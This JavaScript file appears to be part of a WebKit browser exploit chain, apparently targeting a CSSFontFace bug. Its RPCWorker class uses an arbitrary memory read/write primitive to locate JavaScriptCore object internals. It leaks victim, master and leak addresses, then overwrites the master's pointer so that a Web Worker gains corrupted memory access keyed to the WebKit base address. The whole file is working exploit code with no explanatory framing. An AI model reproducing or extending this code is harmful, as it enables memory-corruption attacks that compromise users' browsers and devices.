//#region Classes
class RPCWorker {
  constructor(name) {
    if (typeof name !== "string") {
      throw new Error(`${name} not a valid name !!`);
    }

    this.id = 0;
    this.name = name;
    this.transfer = [];
    this.promises = new Map();
    this.worker = new Worker("src/cssfontface/worker.js");

    this.worker.onmessage = (e) => {
      const { id, type, value } = e.data || {};

      if (type === "log") {
        logger.log(value);
        return;
      }

      const promise = this.promises.get(id);
      if (!promise) return;

      this.promises.delete(id);

      switch (type) {
        case "ret":
          promise.resolve(value);
          break;
        case "err":
          promise.reject(value);
          break;
      }
    };
  }

  terminate() {
    this.worker.terminate();
  }

  execute(name, ...args) {
    return new Promise((resolve, reject) => {
      const id = this.id++;

      this.promises.set(id, { resolve, reject });

      this.worker.postMessage({ id, name, args }, this.transfer);
    });
  }

  async init() {
    logger.debug(`initializing ${this.name}...`);

    const marker_arr = await this.execute("init", this.name);

    const marker_buf_data = marker_arr.buffer.data();
    logger.debug(`marker_buf_data: ${marker_buf_data}`);

    const marker_storage_addr = arw.view(marker_buf_data).getBInt(constants.marker_storage, true);
    logger.debug(`marker_storage_addr: ${marker_storage_addr}`);

    const marker_addr = arw.view(marker_storage_addr).getBInt(8, true);
    logger.debug(`marker_addr: ${marker_addr}`);

    const marker_butterfly_addr = arw.view(marker_addr).getBInt(8, true);
    logger.debug(`marker_butterfly_addr: ${marker_butterfly_addr}`);

    const marker_butterfly_prop_addr = marker_butterfly_addr.sub(0x20);
    logger.debug(`marker_butterfly_prop_addr: ${marker_butterfly_prop_addr}`);

    const victim_addr = arw.view(marker_butterfly_prop_addr).getBInt(0, true);
    logger.debug(`victim_addr: ${victim_addr}`);

    const master_addr = arw.view(marker_butterfly_prop_addr).getBInt(8, true);
    logger.debug(`master_addr: ${master_addr}`);

    const leak_addr = arw.view(marker_butterfly_prop_addr).getBInt(0x10, true);
    logger.debug(`leak_addr: ${leak_addr}`);

    arw.view(master_addr).setBInt(0x10, victim_addr, true);

    await this.execute("setup", leak_addr, webkit_base);

    logger.debug(`${this.name} initialized !!`);
  }
}
//#endregion
